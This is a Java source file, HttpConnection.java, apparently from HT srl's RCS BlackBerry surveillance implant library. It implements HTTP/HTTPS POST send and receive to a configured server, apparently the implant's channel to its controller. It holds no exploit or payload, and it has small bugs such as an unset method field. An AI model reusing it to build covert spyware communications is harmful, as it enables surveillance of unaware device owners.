//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : HttpConnection.java
 * Created      : 26-apr-2010
 * *************************************************/
package blackberry.transfer;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.HttpConnection;
import javax.microedition.io.HttpsConnection;
import javax.microedition.io.SecurityInfo;

import net.rim.device.api.util.IntVector;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

/**
 * The Class DirectTcpConnection.
 */
public final class CHttpConnection extends Connection {

    //#ifdef DEBUG
    static Debug debug = new Debug("HttpConnection", DebugLevel.VERBOSE);

    //#endif

    public static final int METHOD_FIRST = 0;
    public static final int METHOD_DEVICE = 0;
    public static final int METHOD_NODEVICE = 1;
    public static final int METHOD_NULL = 2;
    public static final int METHOD_LAST = 2;

    private final String host;
    private final int port;
    private final boolean ssl;

    int timeout = 3 * 60 * 1000;

    int method;

    HttpConnection connection = null;
    int rc;

    // Constructor
    /**
     * Instantiates a new direct tcp connection.
     * 
     * @param host_
     *            the host_
     * @param port_
     *            the port_
     * @param ssl_
     *            the ssl_
     * @param deviceside_
     *            the deviceside_
     */
    public CHttpConnection(final String host_, final int port_,
            final boolean ssl_, final int method_) {
        host = host_;
        port = port_;
        ssl = ssl_;

        if (ssl) {
            url = "https://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;

        } else {
            url = "http://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;
        }

        //#ifdef DEBUG_TRACE
        debug.trace("method: " + method);
        //#endif

        switch (method) {
        case METHOD_DEVICE:
            url += ";deviceside=true";
            break;
        case METHOD_NODEVICE:
            url += ";deviceside=false";
            break;
        case METHOD_NULL:
            break;

        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#error(java.lang.String)
     */
    protected void error(final String string) {
        //#ifdef DEBUG
        debug.error(string);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#isActive()
     */
    public synchronized boolean isActive() {
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#trace(java.lang.String)
     */
    protected void trace(final String string) {
        //#ifdef DEBUG_TRACE
        debug.trace(string);
        //#endif
    }

    public synchronized boolean connect() {
        try {
            if (ssl) {
                connection = (HttpsConnection) Connector.open(url);
                HttpsConnection sconn = (HttpsConnection) connection;
                SecurityInfo info = sconn.getSecurityInfo();

                //#ifdef DEBUG_TRACE
                debug
                        .trace("SecurityInfo cert: "
                                + info.getServerCertificate());
                //#endif

            } else {
                connection = (HttpConnection) Connector.open(url);
            }

            connection.setRequestMethod(HttpConnection.POST);

            connection.setRequestProperty("User-Agent",
                    "Profile/MIDP-2.0 Configuration/CLDC-1.0");
            connection.setRequestProperty("Content-Language", "en-US");
            connection.setRequestProperty("Connection", "keep-alive");

            for (int i = 0; connection.getHeaderFieldKey(i) != null; i++) {
                String headerKey = connection.getHeaderFieldKey(i);

                if (headerKey.equalsIgnoreCase("set-cookie")) {
                    String cookie = connection.getHeaderField(i);
                    //#ifdef DEBUG_TRACE
                    debug.trace("cookie: " + cookie);
                    //#endif
                }
            }

            //#ifdef DEBUG_TRACE
            debug.trace("in: " + in);
            debug.trace("out: " + out);
            //#endif

        } catch (IOException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
            return false;
        }

        return connection != null;
    }

    public synchronized void disconnect() {
        if (in != null)
            try {
                in.close();
                in = null;
            } catch (IOException e) {
                //#ifdef DEBUG_ERROR
                debug.error(e);
                //#endif
            }
        if (out != null)
            try {
                out.close();
                out = null;
            } catch (IOException e) {
                //#ifdef DEBUG_ERROR
                debug.error(e);
                //#endif
            }
        if (connection != null)
            try {
                connection.close();
                connection = null;
            } catch (IOException e) {
                //#ifdef DEBUG_ERROR
                debug.error(e);
                //#endif
            }
    }

    public byte[] receive(final int length) throws IOException {
        try {

            //#ifdef DEBUG_TRACE
            debug.trace("receive");
            //#endif

            if (out == null) {
                out = connection.openDataOutputStream();
            }
            if (out == null) {
                //#ifdef DEBUG_TRACE
                debug.trace("no out");
                //#endif
            } else {
                //#ifdef DEBUG_TRACE
                debug.trace("out");
                //#endif
            }

            out.write("ANSWER".getBytes());
            out.flush(); // Optional, getResponseCode will flush

            //#ifdef DEBUG_TRACE
            debug.trace("sent");
            //#endif

            // Getting the response code will open the connection,
            // send the request, and read the HTTP response headers.
            // The headers are stored until requested.
            rc = connection.getResponseCode();
            if (rc != HttpConnection.HTTP_OK) {
                //#ifdef DEBUG_ERROR
                debug.error("HTTP response code: " + rc);
                //#endif
                return null;
            }

            //#ifdef DEBUG_TRACE
            debug.trace("http ok");
            //#endif

            // Get the ContentType
            String type = connection.getType();
            //processType(type);

            if (in == null) {
                in = connection.openDataInputStream();
            }

            // Get the length and process the data
            int len = (int) connection.getLength();

            //#ifdef DEBUG_TRACE
            debug.trace("type: " + type + " len: " + len);
            //#endif

            if (len > 0) {
                //#ifdef DEBUG_TRACE
                debug.trace(">0");
                //#endif

                byte[] buffer = new byte[len];
                in.read(buffer);
                return buffer;
            } else {
                //#ifdef DEBUG_TRACE
                debug.trace("<=0");
                //#endif

                int ch;

                IntVector vector = new IntVector();
                while ((ch = in.read()) != -1) {
                    vector.addElement(ch);
                }

                byte[] buffer = new byte[vector.size()];
                for (int i = 0; i < buffer.length; i++) {
                    buffer[i] = (byte) (vector.elementAt(i));
                }

                return buffer;
            }

        } catch (Exception e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
            return null;
        }
    }

    public synchronized boolean send(final byte[] data) {
        try {
            if (data == null) {
                debug.trace("no data");
            }
            //#ifdef DEBUG_TRACE
            debug.trace("data len: " + data.length);
            //#endif

            // Getting the output stream may flush the headers

            out = connection.openDataOutputStream();

            if (out == null) {
                //#ifdef DEBUG_TRACE
                debug.trace("no out");
                //#endif
            } else {
                //#ifdef DEBUG_TRACE
                debug.trace("out");
                //#endif
            }

            out.write(data);
            //#ifdef DEBUG_TRACE
            debug.trace("wrote");
            //#endif
            out.flush(); // Optional, getResponseCode will flush

            //#ifdef DEBUG_TRACE
            debug.trace("sent");
            //#endif
            // Getting the response code will open the connection,
            // send the request, and read the HTTP response headers.
            // The headers are stored until requested.
            rc = connection.getResponseCode();
            if (rc != HttpConnection.HTTP_OK) {
                //#ifdef DEBUG_ERROR
                debug.error("HTTP response code: " + rc);
                //#endif
                return false;
            }

            //#ifdef DEBUG_TRACE
            debug.trace("http ok");
            //#endif

            // Get the ContentType  
            String type = connection.getType();
            //processType(type);

            // Get the length and process the data
            int len = (int) connection.getLength();

            //#ifdef DEBUG_TRACE
            debug.trace("type: " + type + " len: " + len);
            //#endif

            in = connection.openDataInputStream();

            if (len > 0) {
                byte[] buffer = new byte[len];
                in.read(buffer);
                //#ifdef DEBUG_TRACE
                debug.trace("read: " + new String(buffer));
                //#endif

            } else {
                //#ifdef DEBUG_TRACE
                debug.trace("not implemented");
                //#endif
                int ch;
                while ((ch = in.read()) != -1) {

                }
            }

            //#ifdef DEBUG_TRACE
            //debug.trace("ACK");
            //#endif

            //out.write("ACK".getBytes());
            //len = (int) connection.getLength();
            //in.read(buffer);      

            //#ifdef DEBUG_TRACE
            debug.trace("done");
            //#endif

        } catch (Exception e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
            return false;
        }

        return true;
    }
}
